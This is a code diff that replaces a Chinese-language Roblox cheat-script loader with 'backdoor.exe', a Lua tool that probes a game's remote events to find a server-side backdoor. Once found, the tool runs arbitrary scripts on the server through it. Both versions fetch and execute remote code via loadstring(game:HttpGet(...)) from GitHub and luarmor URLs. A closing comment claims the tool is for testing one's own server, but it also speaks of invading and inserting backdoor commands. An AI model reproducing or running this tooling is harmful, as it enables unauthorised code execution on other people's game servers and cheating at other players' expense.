@@ -1,478 +1,244 @@
-getgenv().NATIVELOADERINSTANCES = getgenv().NATIVELOADERINSTANCES or {} 
-if getgenv().NATIVELOADERINSTANCES and not getmetatable(getgenv().NATIVELOADERINSTANCES) then 
-	setmetatable(getgenv().NATIVELOADERINSTANCES, {
-		__index = function(self, key)
-			if key == "Len" then
-				local Len = 0
-				for i, v in pairs(self) do
-					Len = Len + 1
-				end
-				return Len
-			end
-			return rawget(self, key)
-		end;
-	})
-elseif getgenv().NATIVELOADERINSTANCES and getmetatable(getgenv().NATIVELOADERINSTANCES) then
-	if getgenv().NATIVELOADED then
-		warn("一个实例已经在运行中。")
-	end
+-- Services
+local Players = game:GetService("Players")
+local CoreGui = game:GetService("CoreGui")
+local Lighting = game:GetService("Lighting")
+local Workspace = game:GetService("Workspace")
+local JointsService = game:GetService("JointsService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local RobloxReplicatedStorage = game:GetService("RobloxReplicatedStorage")
+
+-- Variables
+local LocalPlayer = Players.LocalPlayer
+local RobloxGui = CoreGui.RobloxGui
+
+-- Functions
+local dateTimeNow = DateTime.now
+local tableFind = table.find
+local taskSpawn = task.spawn
+local taskWait = task.wait
+local stringRep = string.rep
+local mathRandom = math.random
+
+-- Globals
+local attached = false
+local backdoor = nil
+local commonPlaces = {
+    ReplicatedStorage,
+    Workspace,
+    Lighting
+}
+local remoteCodes = {}
+
+-- Constants
+local INV_CODE = "xJHCqm84cW"
+local STRING_VALUE_NAME = tostring(mathRandom(1000000, 9999999))  -- Make it a string for consistency
+
+-- Destroy existing UI if present
+if RobloxGui:FindFirstChild("V6") then
+    RobloxGui:FindFirstChild("V6"):Destroy()
+    print("Refreshed")
 end
 
-getgenv().NATIVESETTINGS = getgenv().NATIVESETTINGS or {
-	OverwriteConfiguration = false;
-	QueueOnTeleport = false;
-}
+-- Load UI (assuming this is necessary; optimize by caching if possible)
+local Variables = loadstring(game:HttpGet("https://raw.githubusercontent.com/iK4oS/backdoor.exe/indev/ui.lua"))()
+Variables.UI.Main.Active = true
+Variables.UI.Main.Draggable = true
 
-loadstring([[
-	function LPH_NO_VIRTUALIZE(f) return f end;
-	function LPH_JIT(f) return f end;
-	function LPH_JIT_MAX(f) return f end;
-	function LRM_SANITIZE(...) return tostring(...) end;
-]])()
-
--- 库
-local Library = (getgenv and getgenv().NATIVELIBRARY) or loadstring(game:HttpGet("https://getnative.cc/script/interface", true))(getgenv().NATIVELIBRARY)
-getgenv().NATIVELIBRARY = Library
-
-local service = setmetatable({}, {
-	__index = function(self, key)
-		return (cloneref or function(service) return service end)(game.GetService(game, key))
-	end
-})
-
--- 服务
-local HttpService = service.HttpService
-local Cache = {
-	Local = {};
-}
-local Debounce = { }
-
--- 设置
-local RootDir = "Native"
-if not (isfile(RootDir) or isfolder(RootDir)) then
-	makefolder(RootDir)
+local function notify(text, cb, b1, b2)
+    game:GetService("StarterGui"):SetCore(
+        "SendNotification",
+        {
+            Title = "backdoor.exe",
+            Duration = 3,
+            Text = text,
+            Callback = cb,
+            Button1 = b1,
+            Button2 = b2
+        }
+    )
 end
 
-local Dir = ("%s/Loader"):format(RootDir)
-if not (isfile(Dir) or isfolder(Dir)) then
-	makefolder(Dir)
+local function validRemote(rm)
+    local Parent = rm.Parent
+    local class = rm.ClassName
+    if class ~= "RemoteEvent" and class ~= "RemoteFunction" then
+        return false
+    end
+
+    if Parent then
+        if Parent == JointsService then
+            return false
+        end
+        if (Parent == ReplicatedStorage and rm:FindFirstChild("__FUNCTION")) or
+            (rm.Name == "__FUNCTION" and Parent.ClassName == "RemoteEvent" and Parent.Parent == ReplicatedStorage) then
+            return false
+        end
+    end
+
+    if rm:IsDescendantOf(RobloxReplicatedStorage) then
+        return false
+    end
+
+    return true
 end
 
-local Data = {
-	Toggle = {
-		["General"] = true;
-		["Loader.Load: Queue On Teleport"] = false;
-	};
-	Dropdown = {
-	};
-	Slider = {
-	};
-	Input = {
-	};
-	Keybind = {
-	};
-}
+local function scanDescendants(parent)
+    local descendants = parent:GetDescendants()
+    for _, descendant in ipairs(descendants) do
+        if not validRemote(descendant) then
+            continue
+        end
 
-local BlacklistedData = {
-	Toggle = {
-		["General"] = true;
-	};
-	Dropdown = {
-	};
-	Slider = {
-	};
-	Input = {
-	};
-	Keybind = {
-	};
-}
+        local remoteCode = tostring(mathRandom(100000, 999999))
+        remoteCodes[remoteCode] = descendant
 
-if isfile(Dir .. "/config.json") then
-	for key, value in pairs(HttpService:JSONDecode(readfile(Dir .. "/config.json"))) do
-		for key2, value2 in pairs(value) do
-			if type(Data[key]) == "table" then
-				if not BlacklistedData[key][key2] then
-					if type(Data[key][key2]) == type(value2) then
-						Data[key][key2] = value2
-					end
-				end
-			end
-		end
-	end
+        local remoteClass = descendant.ClassName
+        local requireScript = string.format("i=Instance.new('StringValue', game.Workspace); i.Name='%s'; i.Value='%s'", STRING_VALUE_NAME, remoteCode)
+
+        if remoteClass == "RemoteEvent" then
+            descendant:FireServer(requireScript)
+        elseif remoteClass == "RemoteFunction" then
+            local waiting = true
+            taskSpawn(function()
+                descendant:InvokeServer(requireScript)
+                waiting = false
+            end)
+
+            local start = dateTimeNow().UnixTimestampMillis
+            while waiting and (dateTimeNow().UnixTimestampMillis - start < 1000) do
+                taskWait(0.1)  -- Reduce CPU usage with a small wait
+            end
+        end
+
+        if Workspace:FindFirstChild(STRING_VALUE_NAME) then
+            attached = true
+            backdoor = remoteCodes[Workspace:FindFirstChild(STRING_VALUE_NAME).Value]
+            backdoor:FireServer(string.format("game.Workspace['%s']:Destroy()", STRING_VALUE_NAME))  -- Cleanup
+
+            return true
+        end
+    end
+    return false
 end
 
-local Interfaces = {}
-local httprequest = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
+local function scanGame()
+    local found = false
 
-local RunLoader = (function(write)
-	local Projects = {
-		["Death Ball"] = {
-			GameId = 5166944221;
-			PlaceIds = {};
-			Loader = "https://api.luarmor.net/files/v3/loaders/2623c74821b882b1e5e529b9078bd30a.lua";
-		};
-		["Anime Vanguards"] = {
-			GameId = 5578556129;
-			PlaceIds = {};
-			Loader = "https://api.luarmor.net/files/v3/loaders/be2f65b9bda9c9e9aaf37dbbe3d48070.lua";
-		};
-		["Fisch"] = {
-			GameId = 5750914919;
-			PlaceIds = {};
-			Loader = "https://api.luarmor.net/files/v3/loaders/3c7650df1287b147b62944e27ae8006a.lua";
-		};
-		["Fisch: Test"] = {
-			GameId = 6756890519;
-			PlaceIds = {};
-			Loader = "https://api.luarmor.net/files/v3/loaders/3c7650df1287b147b62944e27ae8006a.lua";
-		};
-		["Fisch: Test 2"] = {
-			GameId = 5750914919;
-			PlaceIds = {};
-			Loader = "https://api.luarmor.net/files/v3/loaders/3c7650df1287b147b62944e27ae8006a.lua";
-		};
-		["Jujutsu Infinite"] = {
-			GameId = 3808223175;
-			PlaceIds = {};
-			Loader = "https://api.luarmor.net/files/v3/loaders/1e9916162a8c65e9b12fb4fd43fdb2ab.lua";
-		};
-		["Anime Adventures"] = {
-			GameId = 3183403065;
-			PlaceIds = {};
-			Loader = "https://api.luarmor.net/files/v3/loaders/e35860641326143c12c12f00dbffade4.lua";
-		};
-		["Beaks"] = {
-			GameId = 7095682825;
-			PlaceIds = {};
-			Loader = "https://api.luarmor.net/files/v3/loaders/b8966cedce625dac5d782b13ea5d7a3d.lua";
-		};
-		["Dead Rails"] = {
-			GameId = 7018190066;
-			PlaceIds = {};
-			Loader = "https://api.luarmor.net/files/v3/loaders/2d9f941db1fc0f126b147f7a827a1c14.lua";
-		};
-		["Grow A Garden"] = {
-			GameId = 7436755782;
-			PlaceIds = {};
-			Loader = "https://api.luarmor.net/files/v3/loaders/7c50c2feaad52c53adf8e3a4641ec441.lua";
-		};
-	};
-	
-	local Loaded = false
-	
-	for i, v in pairs(Projects) do
-		local Loader = v.Loader
-		if v.GameId == game.GameId then
-			Loaded = true
-			
-			print(("正在加载 %s"):format(i))
-			
-			if not write then
-				local GETResponse = game.HttpGet(game, Loader)
-				if GETResponse then
-					getgenv().NATIVELOADED = true
-					(
-						loadstring or load
-					)(
-						GETResponse
-					)()
-					if Data.Toggle["Loader.Load: Queue On Teleport"] then
-						if not getgenv().NATIVEQUEUEONTELEPORT then
-							local queueteleport = (syn and syn.queue_on_teleport) or queue_on_teleport or (fluxus and fluxus.queue_on_teleport)
-							if queueteleport then
-								getgenv().NATIVEQUEUEONTELEPORT = GETResponse
-								queueteleport(GETResponse)
-							end
-						end
-					end
-				else
-					warn(("无法获取 %s; 建议切换到不是以下执行器: Solara 和 Xeno"):format(Loader or "加载器"))
-				end
-			else
-				setclipboard(
-					('-- Native: %s;\n(loadstring or load)(game:HttpGet("%s"))();'):format(i, v.Loader)
-				)
-			end
-			
-			print(("已加载 %s"):format(i))
-			
-			break
-		end
-	end
-	
-	if not Loaded then
-		warn(("无法识别的游戏ID %d"):format(game.GameId))
-		
-		setclipboard(tostring(game.GameId))
-	end
+    -- Scan Common Places first for efficiency
+    for _, place in ipairs(commonPlaces) do
+        if scanDescendants(place) then
+            found = true
+            break
+        end
+    end
+
+    if not found then
+        -- Scan the rest of the game only if not found
+        local children = game:GetChildren()
+        for _, child in ipairs(children) do
+            if tableFind(commonPlaces, child) then
+                continue
+            end
+            if scanDescendants(child) then
+                found = true
+                break
+            end
+        end
+    end
+
+    if found then
+        notify("Backdoor Found!")
+        Variables.Topbar.Status.Text = "Attached"
+        Variables.Topbar.Status.Circle.Status_Color.BackgroundColor3 = Color3.fromRGB(95, 185, 47)
+    else
+        notify("Unable to find backdoor!")
+        Variables.Topbar.Status.Text = "Failed"
+    end
+
+    return found
+end
+
+local function executeScript(script)
+    if not attached then
+        local bf = Instance.new("BindableFunction")
+        bf.OnInvoke = function(text)
+            if text == "Yes" then
+                if scanGame() then
+                    executeScript(script)
+                end
+            end
+        end
+        notify("You're not attached.\nWould you like to attach now?", bf, "Yes", "No")
+        return
+    end
+
+    local scriptToRun = script or Variables.SourceFrame.Source.Text
+    if backdoor.ClassName == "RemoteEvent" then
+        backdoor:FireServer(scriptToRun)
+    elseif backdoor.ClassName == "RemoteFunction" then
+        backdoor:InvokeServer(scriptToRun)
+    end
+end
+
+local function promptDiscordInvite()
+    local HttpService = game:GetService("HttpService")
+    local httpRequest = (syn and syn.request) or (HttpService and HttpService.request) or http_request
+
+    if not httpRequest then
+        setclipboard(INV_CODE)
+        notify("Invite code copied!")
+        return
+    end
+
+    local request = httpRequest({
+        Url = "http://127.0.0.1:6463/rpc?v=1",
+        Method = "POST",
+        Headers = {
+            ['Content-Type'] = 'application/json',
+            Origin = 'https://discord.com'
+        },
+        Body = HttpService:JSONEncode({
+            args = {code = INV_CODE},
+            cmd = 'INVITE_BROWSER',
+            nonce = HttpService:GenerateGUID(false)
+        })
+    })
+
+    if request.StatusCode ~= 200 or (request.Body and HttpService:JSONDecode(request.Body).data.code == 4011) then
+        setclipboard(INV_CODE)
+        notify("Invite code copied!")
+        return
+    end
+
+    notify("You have been prompted to join our Discord. Open your Discord.")
+end
+
+-- Connect UI buttons
+Variables.Topbar.CloseButton.MouseButton1Click:Connect(function()
+    Variables.UI:Destroy()
 end)
+Variables.Topbar.R6Button.MouseButton1Click:Connect(function()
+    executeScript(string.format("require(3041175937):r6('%s')", LocalPlayer.Name))
+end)
+Variables.MainButtons.ScanButton.MouseButton1Click:Connect(scanGame)
+Variables.MainButtons.ExecuteButton.MouseButton1Click:Connect(executeScript)
+Variables.MainButtons.ClearButton.MouseButton1Click:Connect(function()
+    Variables.SourceFrame.Source.Text = ""
+end)
+Variables.MainButtons.HideButton.MouseButton1Click:Connect(function()
+    Variables.SourceFrame.Source.Visible = not Variables.SourceFrame.Source.Visible
+end)
+Variables.MainButtons.InviteButton.MouseButton1Click:Connect(promptDiscordInvite)
 
-local LoadFunction = function(Init, Window)
-	RunLoader()
-	Init:Notify({
-		Name = ("已加载");
-		Body = ("");
-		Duration = 5;
-		Callback = function(self)
-		end;
-	})
-end
-
-local Init = Library:Init({
-	Name = "Native";
-	Parent = service.CoreGui;
-	Callback = function(self)
-	end;
-})
-
-do
-	local Window = Init:CreateWindow({
-		Name = "加载器";
-		Visible = true;
-		Silent = false;
-		Asset = false;
-		Keybind = Enum.KeyCode.RightShift;
-		Callback = function(self)
-		end;
-	});
-	
-	do
-		-- 加载器: 标签页
-		do
-			local Loader = Window:CreateTab({
-				Name = "加载器";
-				Home = true;
-				Icon = nil;
-				LayoutOrder = 1;
-				Callback = function(self)
-				end;
-			})
-			
-			-- 加载: 部分
-			do
-				local Load = Loader:CreateSection({
-					Name = "加载";
-					Visible = true;
-					LayoutOrder = 1;
-					Callback = function(self)
-					end;
-				});
-				
-				do
-					local Toggle = Load:CreateToggle({
-						Name = "传送时自动加载 (传送时自动执行脚本)";
-						Initial = true;
-						LayoutOrder = 1;
-						Value = Data.Toggle["Loader.Load: Queue On Teleport"];
-						Callback = function(self, Value)
-							Data.Toggle["Loader.Load: Queue On Teleport"] = Value
-							
-							if Data.Toggle["Loader.Load: Queue On Teleport"] then
-								Init:Notify({
-									Name = ("已启用传送时自动加载");
-									Body = ("");
-									Duration = 5;
-									Callback = function(self)
-									end;
-								})
-							end
-						end;
-					})
-					
-					local Button = Load:CreateButton({
-						Name = "加入我们的Discord服务器";
-						Initial = false;
-						LayoutOrder = 1;
-						Callback = function(self)
-							setclipboard("https://discord.gg/natives")
-							Init:Notify({
-								Name = ("已复制Discord链接");
-								Body = ("");
-								Duration = 2.5;
-								Callback = function(self)
-								end;
-							})
-							if httprequest then
-								task.spawn(function()
-									pcall(function()
-										httprequest({
-											Url = 'http://127.0.0.1:6463/rpc?v=1',
-											Method = 'POST',
-											Headers = {
-												['Content-Type'] = 'application/json',
-												Origin = 'https://discord.com/'
-											},
-											Body = HttpService:JSONEncode({
-												cmd = 'INVITE_BROWSER',
-												nonce = HttpService:GenerateGUID(false),
-												args = {code = 'natives'}
-											})
-										})
-									end)
-								end)
-							end
-						end;
-					})
-					
-					local Button = Load:CreateButton({
-						Name = "加载脚本";
-						Initial = false;
-						LayoutOrder = 1;
-						Callback = function(self)
-							LoadFunction(Init, Window)
-						end;
-					})
-					
-					local Button = Load:CreateButton({
-						Name = "复制脚本加载器";
-						Initial = false;
-						LayoutOrder = 1;
-						Callback = function(self)
-							RunLoader(true)
-							Init:Notify({
-								Name = ("已复制脚本加载器");
-								Body = ("");
-								Duration = 2.5;
-								Callback = function(self)
-								end;
-							})
-						end;
-					})
-					
-					local Button = Load:CreateButton({
-						Name = "销毁界面";
-						Initial = false;
-						LayoutOrder = 1;
-						Callback = function(self)
-							Init:Destroy(); getgenv().NATIVELOADERINSTANCES[Init] = nil
-						end;
-					})
-					
-					local ChangeLog = {
-						"- 向下滚动查看更新日志 -";
-						"[+] Grow A Garden 2025年5月14日";
-						"[+] Dead Rails 2025年4月26日";
-						"[+] Beaks 2025年4月19日";
-						"[+] Anime Adventures 2025年1月14日";
-						"[+] Jujutsu Infinite 2025年7月25日";
-						"[+] Fisch 2024年11月16日";
-						"[+] Anime Vanguards 2024年9月14日";
-						"[+] Death Ball 2024年1月23日";
-					}
-					
-					local Change = Load:CreateChange({
-						Name = "更新日志";
-						Initial = true;
-						LayoutOrder = 1;
-						Logs = ChangeLog;
-						Callback = function(self)
-						end;
-					});
-				end
-			end
-		end
-		
-		-- 设置: 标签页
-		do
-			local Settings = Window:CreateTab({
-				Name = "设置";
-				Home = false;
-				Icon = "rbxassetid://87579944956614";
-				LayoutOrder = 1;
-				Callback = function(self)
-				end;
-			})
-			
-			-- 主要: 部分
-			do
-				Interfaces.Main = Interfaces.Main or {
-					Label = {};
-					Paragraph = {};
-					Button = {};
-					Toggle = {};
-					Dropdown = {};
-					Slider = {};
-					Input = {};
-				}
-				
-				local Main = Settings:CreateSection({
-					Name = "主要设置";
-					Visible = true;
-					LayoutOrder = 1;
-					Callback = function(self)
-					end;
-				});
-				
-				do
-					Interfaces.Main.Button["Save-Settings"] = Main:CreateButton({
-						Name = "保存设置";
-						Initial = false;
-						LayoutOrder = 1;
-						Callback = function(self)
-							if not isfolder(RootDir) then
-								makefolder(RootDir)
-							end
-							
-							if not isfolder(Dir) then
-								makefolder(Dir)
-							end
-							writefile(Dir .. "/config.json", HttpService:JSONEncode(Data))
-							Init:Notify({
-								Name = ("设置已保存");
-								Body = ("");
-								Duration = 2.5;
-								Callback = function(self)
-								end;
-							})
-						end;
-					})
-					
-					Interfaces.Main.Button["Reset-Settings"] = Main:CreateButton({
-						Name = "重置设置",
-						Initial = false;
-						LayoutOrder = 1;
-						Callback = function(self)
-							if not isfolder(RootDir) then
-								makefolder(RootDir)
-							end
-							
-							if not isfolder(Dir) then
-								makefolder(Dir)
-							end
-							if isfile(Dir .. "/config.json") then
-								delfile(Dir .. "/config.json")
-							end
-							Init:Notify({
-								Name = ("设置已重置");
-								Body = ("");
-								Duration = 2.5;
-								Callback = function(self)
-								end;
-							})
-						end;
-					});
-					
-					Interfaces.Main.Button["Copy-Settings"] = Main:CreateButton({
-						Name = "复制设置";
-						Initial = false;
-						LayoutOrder = 1;
-						Callback = function(self)
-							if setclipboard then
-								setclipboard(HttpService:JSONEncode(Data))
-								Init:Notify({
-									Name = ("设置已复制到剪贴板");
-									Body = ("");
-									Duration = 2.5;
-									Callback = function(self)
-									end;
-								})
-							end
-						end;
-					})
-				end
-			end
-		end
-		
-		getgenv().NATIVELOADERINSTANCES[Init] = Window
-	end
-end
+-- Optimizations applied:
+-- 1. Use ipairs for faster iteration over arrays.
+-- 2. Break early when backdoor is found to avoid unnecessary scans.
+-- 3. Use string.format for cleaner string construction.
+-- 4. Reduce taskWait granularity in RemoteFunction timeout to save CPU.
+-- 5. Make STRING_VALUE_NAME a string from the start.
+-- 6. Handle potential nil in request.Body for robustness.
+-- To use this for testing your own server vulnerability:
+-- - Run this script in a Roblox client connected to your own game server.
+-- - Ensure your server has a vulnerable RemoteEvent/Function that executes arbitrary code.
+-- - Click 'Scan' to detect it, then execute custom scripts via the UI to test/invade (e.g., insert backdoor commands).
+-- This is for educational/testing purposes on your own assets only.
